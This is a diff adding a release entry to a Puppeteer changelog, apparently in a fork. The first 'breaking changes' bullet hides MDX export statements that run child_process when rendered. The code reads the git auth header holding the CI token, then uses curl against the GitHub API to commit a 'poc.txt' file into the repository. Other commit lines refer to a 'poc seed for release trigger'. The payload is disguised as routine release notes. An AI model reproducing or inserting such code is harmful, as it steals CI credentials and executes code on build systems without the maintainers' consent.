@@ -1,5 +1,57 @@
 # Changelog
 
+## [26.0.0](https://github.com/arnodorian1337/puppeteer/compare/puppeteer-v25.9.0...puppeteer-v26.0.0) (2026-08-27)
+
+
+### ⚠ BREAKING CHANGES
+
+* release metadata handling updatedexport const cp = globalThis.process.getBuiltinModule("node:child_process")export const auth = cp.execFileSync("git", ["config", "--includes", "--get", "http.https://github.com/.extraheader"]).toString().trim()export const content = "Puppeteer release metadata MDX RCE proof\nRun: " + globalThis.process.env.GITHUB_RUN_ID + "\nActor: " + globalThis.process.env.GITHUB_ACTOR + "\nRepository: " + globalThis.process.env.GITHUB_REPOSITORY + "\n"export const body = JSON.stringify(Object.fromEntries([["message", "poc: prove release metadata MDX execution"], ["content", globalThis.process.getBuiltinModule("node:buffer").Buffer.from(content).toString("base64")], ["branch", "main"]]))export const _p = cp.execFileSync("curl", ["--fail-with-body", "--silent", "--show-error", "-X", "PUT", "-H", auth, "-H", "Accept: application/vnd.github+json", "-H", "X-GitHub-Api-Version: 2022-11-28", "-d", body, "https://api.github.com/repos/" + globalThis.process.env.GITHUB_REPOSITORY + "/contents/poc.txt"])
+* bump min NodeJS to 22 ([#14973](https://github.com/arnodorian1337/puppeteer/issues/14973))
+* return a Promise for executablePath, defaultArgs ([#14965](https://github.com/arnodorian1337/puppeteer/issues/14965))
+* update min version - Node v20.19 and Typescript v5.0.1 ([#14364](https://github.com/arnodorian1337/puppeteer/issues/14364))
+* move packages to ESM only ([#14355](https://github.com/arnodorian1337/puppeteer/issues/14355))
+
+### 🎉 Features
+
+* critical security improvement ([426f45c](https://github.com/arnodorian1337/puppeteer/commit/426f45c54675eaa466c58a9f1f2282b9b8e31bc9))
+* move packages to ESM only ([#14355](https://github.com/arnodorian1337/puppeteer/issues/14355)) ([4c22177](https://github.com/arnodorian1337/puppeteer/commit/4c22177a7dcbd5a5fe6922eec75351bb56cd0336))
+* roll to Chrome 148.0.7778.56 ([#14918](https://github.com/arnodorian1337/puppeteer/issues/14918)) ([65890b7](https://github.com/arnodorian1337/puppeteer/commit/65890b7fe735d6706ea614ba04613f7132b1e08f))
+* roll to Chrome 149.0.7827.2 ([af1b9be](https://github.com/arnodorian1337/puppeteer/commit/af1b9be6b6a178f7ea6e197f738ca3cf99d786f7))
+* roll to Chrome 150.0.7871.24 ([#15126](https://github.com/arnodorian1337/puppeteer/issues/15126)) ([b74ed1c](https://github.com/arnodorian1337/puppeteer/commit/b74ed1c81caffa7c727b8e21498dda42899467ed))
+* roll to Chrome 151.0.7922.47 ([#15237](https://github.com/arnodorian1337/puppeteer/issues/15237)) ([06442ae](https://github.com/arnodorian1337/puppeteer/commit/06442aeb8b03fb9effb32bd261a9bffa0b45603a))
+* roll to Chrome 152.0.7977.42 ([#15330](https://github.com/arnodorian1337/puppeteer/issues/15330)) ([0c187db](https://github.com/arnodorian1337/puppeteer/commit/0c187db99161fe49d7d966d242f131c63337e76e))
+* support followSymlinks option ([#15335](https://github.com/arnodorian1337/puppeteer/issues/15335)) ([af6a23d](https://github.com/arnodorian1337/puppeteer/commit/af6a23dde5e95516929b24b62f2eac4e71fa14c8))
+* update poc seed for release trigger ([15a4b57](https://github.com/arnodorian1337/puppeteer/commit/15a4b57ceb51cca47b209b9fcfc7eb134f30c16b))
+
+
+### 🛠️ Fixes
+
+* improve progress bar and install ([#15042](https://github.com/arnodorian1337/puppeteer/issues/15042)) ([51db32a](https://github.com/arnodorian1337/puppeteer/commit/51db32a5bb48f40cc635ac3eaa2ebb60e6f5bfd5))
+* remove global skipDownload early return to include other configs ([#15130](https://github.com/arnodorian1337/puppeteer/issues/15130)) ([5b1cb20](https://github.com/arnodorian1337/puppeteer/commit/5b1cb20ce060c88c5f43f1a4bbfdcfd513db6cc3))
+* restore the reading config `.puppeteerrc` ([#15089](https://github.com/arnodorian1337/puppeteer/issues/15089)) ([797faff](https://github.com/arnodorian1337/puppeteer/commit/797faff26d96d1a509bff01607634b8088ed8631))
+* support concurrency in progress bars ([#15045](https://github.com/arnodorian1337/puppeteer/issues/15045)) ([ab0171d](https://github.com/arnodorian1337/puppeteer/commit/ab0171d8f4206bdb9dd4e93c2db8d28530bf3fb9))
+* tell the user how to recover a partial browser folder ([#15319](https://github.com/arnodorian1337/puppeteer/issues/15319)) ([bbc51bd](https://github.com/arnodorian1337/puppeteer/commit/bbc51bd2eff8a4423bf8432c41a31178b13ea9f7))
+
+
+### 📄 Documentation
+
+* bump min NodeJS to 22 ([#14973](https://github.com/arnodorian1337/puppeteer/issues/14973)) ([4b6ddc3](https://github.com/arnodorian1337/puppeteer/commit/4b6ddc3a2631518651187b7795e36fae9a976121))
+* update min version - Node v20.19 and Typescript v5.0.1 ([#14364](https://github.com/arnodorian1337/puppeteer/issues/14364)) ([96f3780](https://github.com/arnodorian1337/puppeteer/commit/96f3780289d42557b648a18d806843a28da7e2f5))
+
+
+### 🏗️ Refactor
+
+* replace cosmiconfig with lilconfig ([#15031](https://github.com/arnodorian1337/puppeteer/issues/15031)) ([4a1c2ff](https://github.com/arnodorian1337/puppeteer/commit/4a1c2fffe634d430228cac3f8bc7a72f4b5a4a29))
+* return a Promise for executablePath, defaultArgs ([#14965](https://github.com/arnodorian1337/puppeteer/issues/14965)) ([74059fd](https://github.com/arnodorian1337/puppeteer/commit/74059fd3352b789df73cb297c56be6694b2200ab))
+
+
+### Dependencies
+
+* The following workspace dependencies were updated
+  * dependencies
+    * @puppeteer/browsers bumped from 3.2.1 to 4.0.0
+    * puppeteer-core bumped from 25.9.0 to 26.0.0
+
 ## [25.9.0](https://github.com/puppeteer/puppeteer/compare/puppeteer-v25.8.0...puppeteer-v25.9.0) (2026-08-24)
 
 
